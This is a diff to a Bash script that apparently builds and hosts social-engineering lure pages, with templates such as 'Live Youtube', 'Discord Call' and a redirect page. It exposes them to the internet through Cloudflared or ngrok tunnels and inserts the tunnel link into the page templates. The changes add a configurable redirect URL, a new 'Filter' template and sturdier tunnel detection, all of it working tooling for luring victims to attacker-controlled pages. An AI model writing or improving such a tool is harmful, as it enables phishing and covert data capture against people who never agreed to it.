@@ -110,6 +110,8 @@ replacer() {
     elif echo $option | grep -q "4"; then
         sed "s+forwarding_link+"$1"+g" template.php > index.php
         break
+    elif echo $option | grep -q "5"; then
+        break
     fi
     done
     echo -e "${info}Your urls are: ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \n"
@@ -345,10 +347,11 @@ clear
 echo -e "$logo"
 sleep 1
 echo -e "${ask}Choose an option:
-${red}[${white}1${red}] ${cyan}RTP (Recommended)
+${red}[${white}1${red}] ${cyan}Redirect (Recommended)
 ${red}[${white}2${red}] ${cyan}Flowers
 ${red}[${white}3${red}] ${cyan}Live Youtube
 ${red}[${white}4${red}] ${cyan}Discord Call
+${red}[${white}5${red}] ${cyan}Filter
 ${red}[${white}t${red}] ${cyan}Change Default Tunneler (current: ${red}${TN}${yellow})
 ${red}[${white}0${red}] ${cyan}Exit${blue}
 "
@@ -359,12 +362,27 @@ read option
 # Select template
     if echo $option | grep -q "1"; then
         dir="rtp"
+        # Pedir URL de redirecionamiento para Redirect
+        while true; do
+            printf "\n${ask}Enter redirect URL (e.g., https://example.com):${cyan}\n\nDevCenterX${nc}@${blue}> ${red}$ ${nc}"
+            read redirect_url
+            if [ -z "$redirect_url" ]; then
+                echo -e "\n${error}Invalid input!\n\007"
+                sleep 1
+            else
+                echo -e "\n${success}✓ Redirect URL configured: ${cyan}${redirect_url}${nc}\n"
+                sleep 1
+                break
+            fi
+        done
         break
     elif echo $option | grep -q "2"; then
         dir="flowers"
+        redirect_url=""
         break
     elif echo $option | grep -q "3"; then
         dir="live"
+        redirect_url=""
         printf "\n${ask}Enter youtube video ID:${cyan}\n\nDevCenterX${nc}@${blue}> ${red}$ ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
@@ -375,6 +393,11 @@ read option
         fi
     elif echo $option | grep -q "4"; then
         dir="om"
+        redirect_url=""
+        break
+    elif echo $option | grep -q "5"; then
+        dir="filter"
+        redirect_url=""
         break
     elif echo $option | grep -q "t"; then
         if [ $TN == "Cloudflared" ]; then
@@ -428,7 +451,13 @@ unzip ${dir}.zip > /dev/null 2>&1
 rm -rf ${dir}.zip
 else
 cd $dir
-fi 
+fi
+
+# Si es Redirect (rtp), generar index2.html con el URL configurado
+if [ "$dir" = "rtp" ] && [ -n "$redirect_url" ]; then
+    echo -e "\n${info}Generating Redirect page with redirect URL...\n"
+    php "$cwd/generate_stream.php" "$redirect_url"
+fi
 
 # Hotspot required for termux
 if $termux; then
@@ -466,15 +495,15 @@ ngrokcheck=true
 else
 ngrokcheck=false
 fi
-cflink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$HOME/.cffolder/log.txt")
-if (echo "$cflink" | grep -q "cloudflare"); then
-cfcheck=true
+cflink=$(grep -oE 'https://[A-Za-z0-9.-]+\.trycloudflare\.com' "$HOME/.cffolder/log.txt" | head -n1)
+if [ -n "$cflink" ]; then
+    cfcheck=true
 else
-cfcheck=false
+    cfcheck=false
 fi
 while true; do
 if ( $cfcheck && $ngrokcheck ); then
-    if [ $TN == "Cloudflared" ]; then
+    if [ "$TN" == "Cloudflared" ]; then
         echo -e "${success}Cloudflared choosen!\n"
         replacer "$cflink"
     else
@@ -483,7 +512,7 @@ if ( $cfcheck && $ngrokcheck ); then
     fi
     break
 fi
-if ( $cfcheck &&  ! $ngrokcheck ); then
+if ( $cfcheck && ! $ngrokcheck ); then
     echo -e "${success}Cloudflared started succesfully!\n"
     replacer "$cflink"
     break
@@ -493,7 +522,7 @@ if ( ! $cfcheck && $ngrokcheck ); then
     replacer "$ngroklink"
     break
 fi
-if ! ( $cfcheck && $ngrokcheck ); then
+if ! ( $cfcheck || $ngrokcheck ); then
     echo -e "${error}Tunneling failed!\n"
     killer; exit 1
 fi
